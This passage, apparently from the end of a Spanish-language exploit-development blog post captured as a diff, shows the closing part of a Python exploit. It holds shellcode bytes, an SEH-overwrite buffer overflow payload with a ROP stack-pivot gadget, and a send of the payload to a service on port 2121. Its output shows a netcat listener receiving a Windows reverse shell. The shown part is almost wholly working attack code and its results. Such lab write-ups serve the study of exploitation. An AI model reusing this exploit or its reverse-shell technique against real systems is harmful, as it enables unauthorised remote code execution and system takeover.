+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe5\xb6\x96\xe0\xa3\x61\x0f\x98\xe9\xf9\xae</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x65\x24\x84\xf1\xee\xcb\x79\xbf\x06\xa1\x69</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x28\xe7\xfc\xd3\xff\xf8\x2a\x7b\x63\x6a\xb1</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x7b\xea\x97\x6e\x2c\xbb\x66\x67\xb8\x51\xd0</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd1\xde\xab\x84\x1a\x5a\x70\x75\xa4\x63\xf5</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xc1\x82\x73\xc3\xca\x8e\x27\x9b\x9c\x58\x91</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5d\x77\x2b\x4b\x34\x24\xe5\x1b\xc1\x06\x36</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5d\xce\x42\xc0\x81\x7f\x3b\x95\xbe\xb0\xab</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x11\xc7\xac\x4b\xdd\x12\x75\x7b\x94\x3e\xdc</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x14\x71\xab\x5c\x79\x82\x06\xa2\x84\x01\xa2</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5b\x73\x19\xc7\x5e\x3f\x9d\x34\x13\x50\x48</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x3a\x80\x51\x59</span><span class="s">"</span><span class="p">
+
+offset</span><span class="o"> =</span><span class="mi"> 1032</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset </span><span class="o">- </span><span class="no">len</span><span class="p">(rop</span><span class="o"> +</span><span class="p"> shellcode))
+
+nseh</span><span class="o"> =</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+seh</span><span class="o"> =</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x11396</span><span class="p">)</span><span class="c1"> # add esp, 0xe10; ret;</span><span class="p">
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> rop
+payload</span><span class="o"> +=</span><span class="p"> shellcode
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> nseh</span><span class="o"> +</span><span class="p"> seh
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="p"> (</span><span class="mi">3200</span><span class="o"> -</span><span class="no"> len</span><span class="p">(payload))
+
+shell.sendline(</span><span class="no">b</span><span class="s">"TEST "</span><span class="o"> +</span><span class="p"> payload)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 2121: Done  
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente al ejecutar nuestro exploit de forma remota obtenemos una reverse shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 192.168.100.5 50047
+Microsoft Windows [Versión 10.0.20348.709]
+(c) Microsoft Corporation. Todos los derechos reservados.  
+
+C:\> </span><span class="am">whoami</span><span class="p">
+windows\user
+C:\></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
+
